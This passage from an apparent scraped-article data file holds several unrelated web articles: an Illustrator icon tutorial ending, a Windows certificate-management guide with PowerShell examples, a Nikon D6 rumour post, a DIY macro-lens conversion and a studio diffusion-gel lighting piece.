sticks. \nStep 7 \nAdd the little string segments using two 20 x 12 px rectangles with a 4 px thick Stroke ( #383C44 ), which we will position as seen in the reference image. \nStep 8 \nAdjust the shapes that we\u2019ve just created by setting the Radius of their outer corners to 6 px from within the Transform panel\u2019s Rectangle Properties , making sure to remove their inner facing anchor point afterwards. Once you\u2019re done, select the resulting shapes and the belt itself and then group them together using the Control-G keyboard shortcut. \nStep 9 \nStart working on the actual clock by creating its main body using a 24 x 24 px circle ( #FFFFFF ) with a 4 px thick outline ( #383C44 ), which we will group ( Control-G ) and then center align to the underlying belt. \nStep 10 \nAdd the little time indicators using four 2 x 2 px circles, which we will color using #383C44 , and then position at a distance of 2 px from the larger outline, making sure to select and group them together before moving on to the next step. \nStep 11 \nFinish off the clock and with it the project itself, by drawing the tongues using a 4 px thick Stroke with a Round Cap and Join , following the reference image as your main guide. Once you\u2019re done, select and group ( Control-G ) all of the clock\u2019s composing shapes together, doing the same for the entire dynamite icon afterwards. \nGreat Job! \nWe set out to create a little western inspired dynamite icon, and using just a couple of shapes and tools we\u2019ve managed to put it together in no time. \nThat being said, I hope you managed to follow each and every step of the process, and if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can. \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Dynamite Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "Managing Certs with Windows Certificate Manager and PowerShell [Tutorial]",
      "text": "Read more posts by this author. \nIf you're a Windows system administrator, you might have been forced to work with certificates. Working with certificates in Windows is typically one of those extra hats a sysadmin has to take on. Certificates are notoriously complex and hard to understand but in this article, you'll get a chance to discover certificates aren't that scary in Windows! \nThis article will cover mainly working with certificates in Windows. If you'd like to learn more about how certificates work in general, check out this article's companion X.509 Certificate Tutorial article. \nUnderstanding Certificate Stores \nWithin Windows, all certificates exist in logical storage locations referred to as certificate stores . Certificate stores are \"buckets\" where Windows keeps all certificates that are currently installed and a certificate can be in more than one store. \nUnfortunately, certificate stores are not the most intuitive concept with which to work. You will read about how to differentiate these stores and how to work with them below. \nEach store is located in the Windows Registry and on the file system. Refer to the below table for details. When working with a certificate in a store, you are interfacing with the logical store; not directly modifying the registry or file system. This simpler manner lets you work with a single object while Windows takes care of how to represent that object on disk. \nYou'll sometimes see certificate stores referred to as physical or logical stores. Physical stores reference the actual file system or registry location where the registry key(s) and/or file(s) are stored. Logical stores are dynamic references that reference one or more physical stores. Logical stores are much easier to work with than physical stores for most common use cases. \nWindows stores certificates in two different areas - a user and computer context. A certificate is placed in one of these two contexts depending on if the certificate should be used by a single user, multiple users, or the computer itself. For the rest of this article, a certificate in a user and computer context will be informally called user certificates and computer certificates. \nUser Certificates \nIf you intend for a certificate to be used by a single user, then a user certificate store is ideal. This is the common use case for certificate-based authentication processes such as wired IEEE 802.1x . \nUser certificates are located within the current user's profile and are only logically mapped within that user's context. User certificates are \"mapped\" and are unique for each user, even on the same systems. \nComputer Certificates \nIf a certificate is to be used by all users on a computer or a system process, it should be placed inside of a store in the computer context. For example, if a certificate is to be used on a web server to encrypt communication for all clients, placing a certificate in a store in the computer context would be ideal. \nYou'll see that a computer's certificate store is logically mapped for all user contexts. This allows for certificates in a computer certificate store to be used by all users, depending on the permissions configured for the private key. \nFor more information on private keys, be sure to check out the article X.509 Certificates Tutorial: A Sysadmin Guide . \nComputer certificates are located in the Local Machine Registry hives and the Program Data folder . User certificates are located in the Current User Registry hives and the App Data folder . Below you can see a breakdown of where each type of store is located in the registry and file system. \nContext Registry Path Explanation User HKCU:\\SOFTWARE\\Microsoft\\SystemCertificates\\ Physical store for user-specific public keys User HKCU:\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\ Physical store for user-specific public keys installed by Active Directory (AD) Group Policy Objects (GPOs) Computer HKLM:\\SOFTWARE\\Microsoft\\SystemCertificates\\ Physical store for machine-wide public keys Computer HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\Services\\ Physical store for keys associated with a specific service Computer HKLM:\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\ Physical store for machine-wide public keys installed by GPOs Computer HKLM:\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\ Physical store for machine-wide public keys installed by the Enterprise PKI Containers within an AD domain Context File Location Explanation User $env:APPDATA\\Microsoft\\SystemCertificates\\ Physical store for user-specific public keys and pointers to private keys User $env:APPDATA\\Microsoft\\Crypto\\ Physical store for user-specific private key containers Computer $env:ProgramData\\Microsoft\\Crypto\\ Physical store for machine-wide private key containers \nPrerequisites \nThroughout the rest of this article, you will find multiple examples showing interactions with Windows certificate stores. To replicate these examples, be sure you meet the following prerequisites: \nWindows Vista, Windows Server 2008, or newer operating system. The examples shown use Windows 10 Enterprise version 1903. \nFamiliarity with PowerShell. Although not required, this will be the language used to reference certificates where appropriate. The examples shown have all been created with Windows PowerShell 5.1. \nYou will not need any specific certificates installed to follow along, but using a self-signed certificate is beneficial. \nManaging Certificates in Windows \nIn Windows, there are three primary ways to manage certificates: \nThe Certificates Microsoft Management Console (MMC) snap-in ( certmgr.msc ) \nPowerShell \nThe certutil command-line tool \nIn this article, you'll learn how to manage certificates via the Certificates MMC snap-in and PowerShell. If you'd like to learn more about how to use certutil , check out the Microsoft Docs . \nPowerShell vs. the Certificates MMC Snap-in \nSince certificates can be managed a few different ways in Windows, which one do you choose? Should you go the GUI (MMC) route or command-line with PowerShell? \nFirst, consider the lifecycle of a certificate. If you only intend to install or remove a single certificate once, consider using the MMC. But if you're managing multiple certificates or find yourself performing the same task over and over again, the command-line route may be the way to go. Even if you don't know how to write PowerShell scripts, it'd be worth learning if you have many different certificates to manage. \nTo get started, let's first take a look at how to discover the certificates installed on your Windows PC using both the Certificate Manager and PowerShell. \nUsing the Windows Certificate Manager ( certmgr.msc) \nTo view certificates with the MMC, open up the Certificate Manager by running certmgr.msc . This will bring up the Windows Certificates MMC. This initial view will provide an overview of all the logical stores displayed in the left window. \nYou can see in the screenshot below the Trusted Root Certification Authorities logical store is selected. \nViewing Physical Stores \nBy default, the MMC will not show the actual physical stores. To do that, you have to change the view. Click on View and then on Options . You will then see options to choose to show physical certificate stores. Enabling this option makes identifying the specific paths within Windows easier. \nYou can now see additional containers are shown under the example Trusted Root Certification Authorities logical store shown previously. The certificates are still grouped relative to their logical stores, but you can now see the physical store, \"Registry\". \nInspecting Attributes \nThere are many attributes of a certificate you can see when viewing them with the MMC. For example, you will likely want to select specific certificates. The easiest way for you to accomplish this is by referencing the certificate's Serial Number or Thumbprint extension value. If the certificate was signed by a certificate authority (CA), it will have a serial number when issued. The Thumbprint is calculated every time the certificate is viewed. \nYou might see various references to certificate extensions in this article. A certificate extension simply provides extra context for a certificate through additional attribute values. For more information, check out this informative Redhat article . \nYou can see some of the attributes for a certificate by opening it up in the MMC as you can see below. \nOne important feature to point out is embedded private keys. Certificates in Windows can also have a corresponding private key. These private keys are stored in corresponding physical stores as encrypted files. \nTo quickly distinguish a certificate with and without a corresponding private key, look at the certificate icon. In the MMC, if the icon simply looks like a piece of paper with a ribbon, there is no corresponding private key. If a certificate does have a private key, you will see a key in in the MMC icon, and you will see a key at the bottom of the General tab when you open the certificate. \nUsing PowerShell \nAs with the MMC, you can view and manage certificates with PowerShell as well. Let's first inspect certificates in their physical stores (the registry and file system). \nBy Physical Store \nUsing the Get-ChildItem PowerShell cmdlet, you can enumerate all of the keys and values inside of the parent HKCU:\\Software\\Microsoft\\SystemCertificates\\CA\\Certificates\\ registry key path. \nThe below command will enumerate all of the currently-logged-in user's certificates in the Intermediate Certification Authorities logical store. \nGet-ChildItem -Path HKCU:\\Software\\Microsoft\\SystemCertificates\\CA\\Certificates\\ \nEach entry in the Registry hive you see will correspond to the Thumbprint of the certificate for a trusted CA and it's certificate in the corresponding property. You can see an example output of this below. \nAnother common store is, the Personal store. Your certificates for this store are located on the file system rather than the Registry. In the following commands we will show these different physical paths and their purposes. \nEach file in the directory, returned by the command below, corresponds to a certificate installed in the Personal current user store. \nGet-ChildItem -Path $env:APPDATA\\Microsoft\\SystemCertificates\\My\\Certificates\\ \nEach file returned in the below command is a reference to the object for a private key created by the Key Storage Provider (KSP) . The file name corresponds to the Subject Key Identifier of the certificate. Each private key you install will have a corresponding file added. \nGet-ChildItem -Path $env:APPDATA\\Microsoft\\SystemCertificates\\My\\Keys\\ \nEach file in the directory returned by the below command is the unique container for the encrypted private key created by the KSP. There is no direct relationship between the file name and the certificate, but the file is the target of the pointer in the earlier command. \nGet-ChildItem -Path $env:APPDATA\\Microsoft\\Crypto\\Keys \nBy Logical Store \nSince working with certificates in their physical paths is uncommon, you will be working with the logical stores for the rest of the examples. \nPowerShell can access Windows logical stores using the Cert: PSDrive . The Cert: PSDrive maps certificates to the physical stores much like the MMC does. \nUnfortunately, the MMC and the Cert PSDrive do not label the logical stores the same. Below you can see a comparison table of the common stores and their names both in the MMC and the Cert PSDrive. \nCert: Certificates MMC My Personal Remote Desktop Remote Desktop Root Trusted Root Certification Authorities CA Intermediate Certification Authorities AuthRoot Third-Party Root Certification Authorities TrustedPublisher Trusted Publishers Trust Enterprise Trust UserDS Active Directory User Object \nSelecting Certificates \nWhen you are working with certificates you will need a way to filter and select certificates to perform specific operations against. Most of the time you will filter and select certificates based on the value of a specific extension. \nFor the following examples you need to start by listing all installed certificates in the root CA store. \nGet-ChildItem -Path Cert:\\CurrentUser\\Root\\ \nThe returned objects will be certificate objects you can use in the following examples. \nCommon extensions are already available as properties of the certificate objects. In the below example you are using Get-Member to list all the properties of the returned objects. \nGet-ChildItem -Path Cert:\\CurrentUser\\Root\\ | Get-Member -MemberType Properties \nAs you can see in Figure 9, some of these extensions, like Issuer, are helpful for finding the certificate you are looking for. Extensions supply information about the certificate, such as who it is issued to, what it can be used for, and any restrictions on it. \nIn more complex use cases you will want to find certificates by other extensions, like the certificate template used. The difficulty is the values for these extensions return as an array of integers. These integers correspond to ASN.1 encoded content. \nThe existing ScriptProperties available on the object show examples for interfacing with these. In the below command you will pull the Key Usages manually to see this relationship. \n((Get-ChildItem -Path Cert:\\CurrentUser\\Root\\ | select -First 1).Extensions | Where-Object {$_.Oid.FriendlyName -eq \"Key Usage\"}).format($true) \nThe new piece we introduce in the above command is the format method, which performs the ASN.1 decoding. You pass it a boolean value (e.g. $true) above to identify whether we want the returned object to be single-line or multi-line. \nYou will use the Thumbprint value from the certificate in Figure 7 in the below command. The Thumbprint value is set as a PowerShell variable and used to select the specific certificate in the below commands. \n$thumb = \"cdd4eeae6000ac7f40c3802c171e30148030c072\" Get-ChildItem -Path Cert:\\CurrentUser\\Root\\ | Where-Object {$_.Thumbprint -eq $thumb} \nCreating Self-Signed Certificates with PowerShell \nPowerShell also has a handy cmdlet to create self-signed certificates called New-SelfSignedCertificate . Self-signed certificates are useful for testing as they allow you to generate a public and private key pair without the use of a CA. \nLet's now create a self-signed certificate in the Current User and the Local Machine stores to use in examples for the next steps. \nIn the example below, PowerShell is generating a public and private key pair, a self-signed certificate, and installing them all into the appropriate certificate stores. \nPS51> New-SelfSignedCertificate -Subject 'User-Test' -CertStoreLocation 'Cert:\\CurrentUser\\My' PS51> New-SelfSignedCertificate -Subject 'Computer-Test' -CertStoreLocation 'Cert:\\LocalMachine\\My' \nUsing self-signed certificates for production services is not encouraged as all the trust-based mechanisms do not exist. \nImporting/Exporting Certificates \nPublic key cryptography is fundamentally based on the public key being widely accessible. Given this tenement you need standard ways to effectively share certificates. Equally as important is security of your private keys. Storing private keys in inaccessible media, or with disaster recovery materials is a common practice for certain private keys. \nBoth of these require ways to store these cryptographic objects in standard formats. Exporting provides the functions to perform storing of these objects and ensure they use widely accepted standard file formats. Importing allows you to bring the cryptographic objects into Windows operating systems. \nUsing the Windows Certificate Manager ( certmgr.msc) \nExporting certificates from the MMC is relatively straight forward. To export a certificate without a private key, simply click on the certificate in the MMC, click on the All Tasks menu and then on Export . \nDuring the export, you will be asked for a file format as shown below. The most common options are DER or Base-64 encoded . \nExporting Private Keys \nTo export a certificate with an associated private key, you'll have to meet two criteria; the logged-in account must have permission to the private key (for computer certificates only) and the private key needs to be marked as exportable. \nTo verify the permissions for a computer's private keys, you can select a certificate with a private key, choose All Tasks , and Manage Private Keys from within the Certificates MMC. The dialog box that opens shows the access control entries for the private keys. \nWhen those two or three prerequisites are met you can select a certificate, click on All Tasks and then on Export just like you would with a certificate with only a public key. When exported, you should now have option to select Yes, export the private key as shown below. \nWhen you export a private key in Windows you can only save the file as a PFX. These file types and encoding formats are detailed at length in this post . \nFor the remaining settings shown in the export wizard, you can use the defaults. The below table is a quick rundown of each. \nSetting Description Including all certificates in the certification path if possible Helps with portability of certificate issuers, and includes all pertinent public keys in the PFX Delete the private key if the export is successful Removes the private key from the file and has few common use cases, but one example is to test access to private keys Export all extended properties Will include any extensions within the current certificate, these relate to the certificates [specific settings]() for Windows interfaces Enable certificate privacy Normally only the private key will be encrypted in the exported PFX file, this setting encrypts the entire contents of the PFX file Group or user names You can use a group or user security principal from Active Directory for encrypting the contents of the PFX file, but a password is the most portable option across legacy systems or computers not joined to the same domain \nImporting Certificates \nThe import function is the same for all supported certificate file types. The only difference is if the file includes a private key you can \"Mark this key as exportable\", which you will read more on below. Windows will leverage the Certificate Import Wizard. \nWhen you use the Certificate Import Wizard for a PFX you will need to supply the password used to encrypt the private key. Here is another recap of the import options. \nSetting Description Enable strong private key protection Requires a password for each access of a private key, be cautious of newer functions as they will not be supported in all software Mark this key as exportable You should try to avoid using this setting on any end system, private keys should be treated similarly to storing passwords Protect private key using [virtualization-based security] The setting provides more security functionality for protecting private keys from advanced malware attacks Include all extended properties Relates to the same Windows-specific settings discussed as with exporting \nPowerShell signing certificates are a good use case for strong private key protection. \nAutomatic placement of certificates can be something of which to be cautious. You will likely have the best results manually selecting the certificate store. \nUsing PowerShell \nNow, with PowerShell export one of the self-signed certificates you created earlier. In the example the Current User is used, but you can use either. \nBelow, you are selecting a certificate in the Current User Personal logical store that was self-signed, meaning where the issuer matches the subject. \n$certificate = Get-Item (Get-ChildItem -Path Cert:\\CurrentUser\\My\\ | Where-Object {$_.Subject -eq $_.Issuer}).PSPath \nNow that you selected a certificate, you can use the Export-Certificate command to save a DER encoded file using the command below. \nExport-Certificate -FilePath $env:USERPROFILE\\Desktop\\certificate.cer -Cert $certificate \nNow lets look at exporting the private key as well. Below you are verifying that the certificate you selected has a private key, if this does not return true, then the Get-Item command likely selected the wrong certificate. \n$certificate.HasPrivateKey \nBelow you will set a password to use for encrypting the private key. Then export the selected certificate into a PFX file and use the password you entered earlier to encrypt the file. \n$pfxPassword = \"ComplexPassword!\" | ConvertTo-SecureString -AsPlainText -Force Export-PfxCertificate -FilePath $env:USERPROFILE\\Desktop\\certificate.pfx -Password $pfxPassword -Cert $certificate \nSimilarly to exporting, there are two commands. One command for importing certificates and one for importing PFX files. \nBelow the Import-Certificate command imports the DER encoded file that you exported earlier to the Current User's Personal store. \nImport-Certificate -FilePath $env:USERPROFILE\\Desktop\\certificate.cer -CertStoreLocation Cert:\\CurrentUser\\My \nLet's say you want to install that certificate\u2019s private key too. \n$pfxPassword = \"ComplexPassword!\" | ConvertTo-SecureString -AsPlainText -Force Import-PfxCertificate -Exportable -Password $pfxPassword -CertStoreLocation Cert:\\CurrentUser\\My -FilePath $env:USERPROFILE\\Desktop\\certificate.pfx \nKeep in mind that the password needs to be a Secure String . As well, if you are importing to the Local Machine store (e.g. Cert:\\LocalMachine\\ ) you will need to run the command from an elevated Administrator prompt. \nIn the above example, you also use the Exportable parameter with the command, marking the private key as exportable in the future. The default is to not be exportable. Exportable private keys are another security consideration, and deserves further focus on how you secure them. \nThere are also many other things to do with certificates in Windows so you should explore more. \nRemoving Certificates with PowerShell \nWhen removing certificates you need to keep in mind there is no Recycle Bin. Once you delete a certificate, it's gone. This means it is critical to confirm you are deleting the correct certificate by validating a unique identifier, like the Serial Number or Thumbprint extension value. \nSimilarly to above, in the below command we select a self-signed certificate from the Current User's Personal store. \n$certificate = Get-Item (Get-ChildItem -Path Cert:\\CurrentUser\\My\\ | Where-Object {$_.Subject -eq $_.Issuer}).PSPath \nBelow you can see the Thumbprint, Serial Number, and Subject properties for the selected certificate to ensure it is the certificate you intend to select. \n$certificate.Thumbprint $certificate.SerialNumber $certificate.Subject \nVerify you have selected the correct certificate you intend to delete. \nThe below command removes all selected certificate objects, please use with caution. By passing the $certificate object through the pipeline to the Remove-Item cmdlet in the below command, you will delete all certificate content without any validation prompts. \n$certificate | Remove-Item \nSummary \nThroughout this article you have worked with certificates in Windows, learning how to access them and some tools to use when working with them. There is much more to explore on the topic, including how to associate installed certificates with specific services, or even how to implement a private Public Key Infrastructure (PKI) by deploying your own Certificate Authorities (CA). \nFurther Reading \nGet the latest posts delivered right to your inbox",

      "text": "Nikon D6 announcement rumoured for February with 4K60p video and dual CFexpress slots \nDecember 6, 2019 by John Aldred Leave a Comment \nSince the initial and somewhat vague \u201c development announcement \u201d in September, Nikon has remained pretty tight-lipped about the impending Nikon D6. They haven\u2019t even said when they\u2019re announcing it, yet, although all indicators pointed towards a date in early 2020, following on from the January 6th announcement dates in 2012 and 2016 for the D4 and D5 respectively. \nBut it seems the announcement may come in a tad later, according to a report on Nikon Rumors . They say they\u2019ve been hearing February 12th, 2020 as a potential announcement date more than once, although it could be for an internal presentation rather than a public announcement. But they do have an updated list of rumoured specs, too. \nDespite the September announcement, the specs have largely remained a secret. But the updated list from NR suggests some rather nice features. \nBuilt-in sensor stabilization (IBIS) \u2013 An improved version from the Nikon Z system \nMore features and customization options for various aspects of the camera and settings \nMobile applications will see improvements but they will likely launch after the camera release \nThe D6 will definitely not be a \u201chybrid\u201d camera, but a DSLR with some mirrorless features \n24 MP sensor \n4K 60 video \nImproved dynamic range \nImproved/better AF system but probably with the same number of AF points \nAdvanced video features with raw recording \nLonger manual exposure times: 1/8000 \u2013 120 seconds (up from 30 seconds) \nDual CFexpress memory card slots \n.76-78x 100% viewfinder \nNew dual Expeed processors \nBuilt-in WiFi \n3.2m-dot touchscreen LCD \nImproved silent shooting modes \nAs for the \u201csome mirrorless features\u201d, NR lists \u201cbetter video, IBIS, silent shooting\u201d as examples. But none of those features are really unique to mirrorless. Video has been getting better with every generation of DSLR anyway and would\u2019ve continued to get better without mirrorless ever having existed. IBIS, too, has been in some DSLRs for a while now. Silent shooting\u2026 Ok, maybe I\u2019ll give \u2019em that one. \nI would suspect that the raw video recording is likely to be external rather than internal, to a device like the Ninja V . That\u2019s what Nikon has been promising for the Z6 and Z7 for almost a year , so perhaps by the time the D6 is announced, their mirrorless cameras will finally be able to do it, too. Maybe they\u2019ll be able to read CFexpress cards by then, too. The only thing holding CFexpress card manufacturers back is the wait for firmware updates to add compatibility. \nThe Canon 1DX Mark III is also expected to be announced at some time in February, too. That will give photographers a few months to get the bodies in their hand and get used to them before the Tokyo 2020 Olympics start in July. \n[via Nikon Rumors ]",

      "text": "Are you looking for an affordable but also electronic macro lens? Or maybe you have an old kit lens that\u2019s just sitting around, collecting dust since your last upgrade? Well then read on, because in this article I am going to share one cool hack that will allow you to transform almost any kit or standard zoom lens into a capable macro lens! \nI am not talking about reversing the lens or mounting it on extension tubes, we\u2019re actually going to convert the lens for good. And it\u2019s incredibly simple. \nThe Theory \nThe basic design of zoom lenses in general is similar: the extendable front element produces a projection of the image into the lens barrel, where the next group of movable elements picks up on this image and projects it further down the lens barrel. The distance between the front element and this inner group, as well its distance to the sensor plane, determines how large the original projection of the front element will be when it arrives at the sensor. \nIn other words: the distances between the lens groups/elements to each other and to the camera sensor decide the zoom factor. This also explains why the minimum f/number increases as we zoom into the scene\u2014a smaller portion of the image circle leaves us with less light. \nBut what if we were to remove the front element from the equation? Then we would have a lens that focuses very close. Close enough to shift the focus plane into the extendable zoom tube of the lens barrel. \nRemove the zoom tube from the equation as well and we have a capable macro lens. \nNote : This a non-reversible procedure in many cases ; however, with some lenses you can simply unscrew it, such as in the example below. \nI have already modified a few lenses this way and so far it has worked for all of them. The video below shows the conversion by the example of an (otherwise pretty useless) old Sigma 18-50mm f/3.5-5.6 DC lens. \nThe basic steps of the conversion are: \nRemove the front element of the lens. \nRemove the extendable zoom barrel or fixate it with glue. \nIn case you decide to remove the zoom barrel and the filter thread is gone, you can glue the screw ring of a tulip lens hood to the front of your lens, such as I did in the photo below. \nAttach a UV or Skylight filter to prevent dust from entering the lens body. \nAlternatively you can glue the filter directly on to the lens body to gain a few millimeters more working distance. If you decide to do so, ensure that the filter is perfectly clean, and that you use a glue that won\u2019t leave fume residue on the glass. \nImages say more than words \nThat\u2019s why I put together a few photos that I took with the Canon and Sigma lenses mentioned above, so you can get a better idea of the images they produce and their quality. \nPros and Cons \nAs with any lens, converted zoom lenses will have their own pros and cons. \nLet\u2019s get the cons out of the way first: \nDue to the nature of this modification, the lens will have a very short working distance. This makes it more suitable for still subjects, but with a bit of luck and patience shots of insects are manageable. \nFlare. Without their front element, many zoom lenses become susceptible to lens flare. To prevent this you can use a flash modifier or a step-ring to serve as a lens hood, whilst not taking away from the working distance. In some cases a UV- or skylight-filter will help too. \nDistortion around the edges of the frame. Since we removed an element from the chain of spherical correction, distortion will become visible around the edges of the frame. This is rarely noticeable though and only an issue with flat-lay subjects such as stamps for example. \nDon\u2019t worry. There are some pros, too: \nFirst of all, this conversion gives you an electronically operated lens that, unlike many other macro lenses, covers quite a magnification range\u2014typically from around 1 to 2.5 times life size on an APS-C sensor. \nMacro lens for less. Let\u2019s take the Canon EF-S 18-55mm II IS as an example: this lens typically sells for less than $100 used. Remove the front element and you get a fully functional and electronically controlled macro lens with image stabilization and focus confirmation (it won\u2019t lose its auto-focus capability either, but it won\u2019t be very useful as it tends to hunt back and forth a lot). \nIt is a neat way to breathe new life into dusty glass. Especially with lenses that have a defective auto-focus, as AF is no help with macro. \nIn terms of sharpness, I have been positively surprised by almost all the lenses I have converted. Especially with the Sigma lens from the video above, as it appeared to be sharper at low f-stops after the conversion than it was before. All lenses that I have handled provided ideal sharpness when zoomed out with some fall-off when fully zoomed in. This is just a rule of thumb however, and varies between models and manufacturers. \nMost converted lenses have a very decent and sometimes even soap-bubbly looking bokeh. \nArtistic Look \nWhen I shoot my EF-S 18-55 wide open it renders images very artistically, with a gorgeous soapy Bokeh and strong aberrations in out-of-focus areas of high contrast. Sharpness is not exactly superior at f/3.5 but definitely enough to work with. \nSharpness \nStop the lens down to f/8 or so for a drastic increase in sharpness, even at its full magnification. \nZoom Range \nTo illustrate the magnification range of my EF-S lens (which is similar for all 4 zoom lenses I have tried so far), I photographed a couple subjects and took two photos each: one at its lowest magnification ration and one at its highest. Check them out below: \nIn the case of EF-S or other dedicated crop-sensor lenses that can not be physically mounted to full-frame cameras, you can use an extension tube in order to overcome the mount barrier. In the example below I used a 36mm Kenko tube to adapt my EF-S lens to a Canon 5DII body. \nEven though the extension tube increases the magnification ratio, the larger sensor makes up for the difference and rewards it with better low-light capabilities and more megapixels. \nThe Bottom Line \nIn my opinion, the benefits of this lens conversion clearly outweigh its cons. I have had a blast using my modified lenses over the last few months and will definitely continue using them. \nIf you are looking for a cheap but effective macro lens or you have a zoom lens that you\u2019re not using anymore, this conversion I something I would consider. Something I would do, actually, that\u2019s how I found out about it. But then this might just be me; I enjoy this sort of thing and own a bunch of modified equipment. \nI should mention that these converted lenses are not exactly easy to handle and will take a bit of practice. But if that\u2019s worth it to you, this is a neat way of getting your hands on an electronically controlled and quite unique macro zoom lens for a great value. \nAbout the author : Maximilian Simson is a London-based portrait and event photographer who also shoots fine art and macro photography.

      "text": "Shooting in a studio has its advantages. But although being warm, dry and convenient are greatly appreciated, shooting between the same four walls can get a little boring if you\u2019re constantly using them as backgrounds for your shots. \nSure, you could get some colored paper setup, you could even buy a fancy canvas sheet with paint splashes on it, and for the really adventurous, you could even use some colored lights behind your subject. But what happens when you\u2019re finally bored of all that? Time to get a little more creative with your studio backgrounds. \nVisual Depth on Location: Depth of Field \nRecently I wanted to find a way to add a sense of depth to my studio backgrounds. I didn\u2019t want my shot to just be two visual layers of model and background, I wanted to somehow make my backgrounds feel like they went beyond what we can initially see. \nOne way we ordinarily do this is with depth of field on location. For example, we set the subject up in the foreground and ensure there are elements behind them that we can throw out of focus with our aperture choice. We do this instinctively now, but it\u2019s a visual trick that the viewer engages with as they are being asked to consider what the blurry elements behind the subject are. This sense of intrigue simply wouldn\u2019t happen if everything was in focus. \nUnfortunately, in a studio, this deep background shot isn\u2019t possible. We have a big empty space and it simply isn\u2019t very interesting to have that empty space behind the subject and no matter how out of focus it is, it\u2019s never going to get the viewer to wonder what\u2019s back there. \nForced Depth: Haze and Smoke \nBut what if we\u2019re shooting in small spaces? How do we create that sense of depth to the background where there is none? \nOne trick to add exaggerated depth or \u2018forced depth\u2019 to a shot in smaller areas like a studio, is to add smoke or mist to the scene. This is yet another visual trick that is employed far more than you think and smoke, mist or artificial atmosphere is used in practically every TV show or movie you\u2019ve seen in recent years. For example; I\u2019m currently watching Gotham on Netflix and that show has haze in EVERY scene! \nIf you\u2019re shooting in tight spaces where there is little depth, or even in big open spaces where there is actually no elements to be seen in the background, mist can be added to trick the eye into thinking there is more going on in the scene than there really is. Again, our eyes are tricked into wanting to know more about what\u2019s going in the hazy areas, and this, in turn, draws us into the scene or shot. On set, this technique is often referred to as \u2018voluminous lighting\u2019 too. \nMist and haze are great tricks to use, but they do have a certain downside and that\u2019s that they\u2019re very hard to control. We can\u2019t simply add mist to the background and not the foreground in a small space like a studio, it will most likely float into the foreground and around our subject as well. As a result, our subject will lack a lot of contrast. Look at the shot above again and you\u2019ll see that the subject is actually shrouded in grey. This doesn\u2019t look out of place, but it\u2019s not always a desired effect on the subject or styling. \nImitating Mist \nSo how do we create a sense of depth with our background in a small space and without pumping the room full of smoke so that our subject is obscured? It\u2019s with this problem in mind that I came up with a possible solution. \nWhat if I could imitate the look of dense mist behind my subject, and then place simple objects behind that so they appear to drop off into this artificial mist extremely quickly? \nThis would allow for my subject to remain crisp and unaffected by any supplemental artificial atmosphere and my backgrounds would have a visual depth to them that would draw the viewer in. \nThe Diffusion Gel Test: The Plant \nIf we look at the properties of mist from a photography standpoint, it simply diffuses the light as it passes through it. Think of clouds on a cloudy day. The light appears far larger and is scattered among the atmosphere, and mist/haze/smoke is doing the same thing on set. \nBut if I wanted to create this softer mist-like look behind my subject, I\u2019d have to explore other alternatives beyond bringing a cloud indoors. \nThankfully in our photographer toolbox, we have other ways of creating this heavily diffused light look and one of them is via diffusion gels. These are sheets of gels that are doing a similar thing to the diffusion cover on the front of your softbox and they will very effectively scatter the light that passes through them. Softboxes actually have a very heavy amount of diffusion on them though, whereas the diffusion gels come in a vast number of densities so I should be able to find the perfect diffused background, but which diffusion gel is the best one for what I was after? \nHere is where I had to test out my idea to find out which diffusion gel would do what I wanted. After all, I wasn\u2019t strictly using the diffusion gel for its intended purpose. \nThankfully I knew this effect would be in the background of the shot so I didn\u2019t actually need to test these diffusion gels with a model. Instead, I simply ordered a big fake plant to sit behind my gels. I felt this fake plant would be perfect as it naturally has a little depth to it thanks to the leaves coming out in all directions. \nThe Diffusion Gel Test: The Diffusion Gels \nOnce I had my plant, it was time to test the diffusion gels. For the diffusion gels I reached out to LEE Filters who seemed to have the widest selection of diffusion solutions I\u2019ve ever seen. They also split their diffusions up between regular \u2018diffusion\u2019, \u2018frosts\u2019, \u2018cloths\u2019 and \u2018spuns\u2019. To be fair, all this choice can be a little daunting when you\u2019re trying to find what you want. Thankfully though, LEE has a very cool image preview and comparison window on their site so you can see exactly how each diffusion will react compared to one another. \nHere\u2019s a link to the LEE Filters diffusion comparator if you want to check it out for yourself. \nI went through their selection and ordered 10 or so diffusion gels that I thought might be good for my particular test and then got to work setting up my scene. \nThe resulting images of my \u2018plant behind diffusion gel\u2019 test aren\u2019t particularly exciting, but I thought I\u2019d share them as a point of reference for you guys to see what I was after and what I felt wasn\u2019t working. \nFrom the images above, you should be able to see that most of the diffusion gels are actually pretty dense and too opaque for me to get the effect I was after. But there was a couple of contenders that looked very promising. The 404 one looked good but it wasn\u2019t giving off a very strong \u2018mist\u2019 vibe that I was looking for. Ultimately I actually thought the 255 was perfect for what I was trying to achieve and it had the best mix of transparency and depth I was after. \nThe Diffusion Gel Test: The Lighting \nOnce I had my particular diffusion gel figured out, I now wanted to test out some lighting options with it. Again, the shots below aren\u2019t necessarily very exciting, but it shows me testing a variety of lighting options and color gel looks that could be a possibility. This process helps me build up a mental picture of exactly how this gel will react in any given situation. \nDuring the testing process, I\u2019m in a very controlled environment and I have no time constraints or model to deal with, so the more knowledge I acquire about this new idea here the better. \nAfter trying a multitude of ideas I eventually decided that a clean white light may actually be the best solution here. I really did love the eerie colored mist look with shafts of light coming through the leaves, but ultimately I felt that this may be a bit heavy for a clean fashion look. But again, this is great knowledge for another potential project and I\u2019d love to incorporate these ideas in another area in a future shoot. \nNo time spent behind the lens is ever wasted. \nShoot Day \nWith the background details set up and understood, all that was left was to light the subject and get both the model and background working together visually in the shot. \nLet\u2019s take a look at the setup I used on the day. \nWe had a large softbox at the back with the plant and then the diffusion gel in front of that. Next, we got the model to stand in front of the diffusion gel and then placed the lights around her. We had two small strip boxes with grids behind pointed back and a 22\u201d beauty dish key with a small gelled softbox fill. \nThe shoot itself was actually pretty easy as I\u2019d tested the trickiest part already. Using the diffusion gels to make the plant look like it was shrouded in the mist behind the subject was the potential tripping point, but it looked surprisingly effective with very little tweaking required. Plus having the light coming through the diffusion from behind meant I could get away with the model being surprisingly close to the gel with no shadows. \nHere are some of the resulting images from the shoot. \nLast Minute Tweaks on the Day: Low Contrast Filter \nThere was one change I made during the initial stages of this shoot and that was to add a low contrast filter to my lens. The reason for this was that the background actually looked too realistic with its 